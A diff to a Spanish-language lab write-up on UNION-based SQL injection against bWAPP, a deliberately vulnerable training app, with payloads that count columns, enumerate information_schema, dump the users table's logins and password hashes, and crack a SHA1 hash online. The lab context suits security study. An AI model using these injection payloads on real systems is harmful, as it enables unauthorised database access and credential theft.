@@ -100,35 +100,45 @@ Se emplea el método de incremento manual con `UNION SELECT`, voy probando consu
 
 ![bWAPPSQL 4](./imagenes/apartado_dos/bwappsql4.png)
 
-Al llegar a `' UNION SELECT 1,2,3,4,5,6,7-- -`, el error desapareció, confirmando que la tabla tiene **7 columnas**.  
+Al llegar a `' union select 1,2,3,4,5,6,7-- -`, el error desapareció, confirmando que la tabla tiene **7 columnas**.  
 
 ![bWAPPSQL 5](./imagenes/apartado_dos/bwappsql5.png)
-![bWAPPSQL 6](./imagenes/apartado_dos/bwappsql6.png)
 
 ---
 
 ### 2.5.3 Mapeo de campos visibles
 
 Al renderizarse la página con los números del 1 al 7, se identificó que solo cuatro columnas son visibles en el HTML:  
+
 - **Columna 2:** Title  
 - **Columna 3:** Release  
 - **Columna 4:** Genre  
 - **Columna 5:** Character
-- 
-![bWAPPSQL 7](./imagenes/apartado_dos/bwappsql7.png)
+  
+![bWAPPSQL 6](./imagenes/apartado_dos/bwappsql6.png)
+
+---
 
 ### 2.5.3  Exfiltración de datos
 
-Puedo obtener el nombre de la base de datos, se sustituyendo el marcador de las comlunmas por funciones como `database()`, `user()`, `version()`,...:
+Puedo obtener el nombre de la base de datos, sustituyendo el marcador de las comlunmas por funciones como `database()`, `user()`, `version()`,...:
 
+![bWAPPSQL 7](./imagenes/apartado_dos/bwappsql7.png)
 ![bWAPPSQL 8](./imagenes/apartado_dos/bwappsql8.png)
+
+Saco las tablas de aplicación con:  
+
+`' union select 1,database(),user(),table_name,version(),6,7 from information_schema.tables where table_schema=database() -- -`.
+
 ![bWAPPSQL 9](./imagenes/apartado_dos/bwappsql9.png)
+
+---
 
 ### 2.5.4  Sacar más información, contraseñas de usuarios
 
-Listo las tablas que tiene la base de datos con `' union select 1,column_name,3,4,5,6,7 from information_schema.columns where table_name='users' and table_schema=database() -- -`.
+Voy a por la tabla usuarios, ya que se pueden conseguir usuarios y contraseñas...:
 
-' union select 1,database(),user(),table_name,version(),6,7 from information_schema.tables where table_schema=database() -- -
+`' union select 1,column_name,3,4,5,6,7 from information_schema.columns where table_name='users' and table_schema=database() -- -`.
 
 
 ![bWAPPSQL 10](./imagenes/apartado_dos/bwappsql10.png)
@@ -136,17 +146,13 @@ Listo las tablas que tiene la base de datos con `' union select 1,column_name,3,
 Extraigo las claves de usuario con `' union select 1,login,password,email,secret,6,7 from users where password<>''-'`.
 
 ![bWAPPSQL 11](./imagenes/apartado_dos/bwappsql11.png)
+
+Copio el hash de la clave y lo identifico en https://duckduckgo.com/.
+
 ![bWAPPSQL 12](./imagenes/apartado_dos/bwappsql12.png)
+
+Por último, uso yn escifrador online sha1: https://sha1.gromweb.com/, la clave de ambos usuarios es **bug**.
+
 ![bWAPPSQL 12](./imagenes/apartado_dos/bwappsql13.png)
-
-
-
-
-
-
-
-
-
-
 
 ---
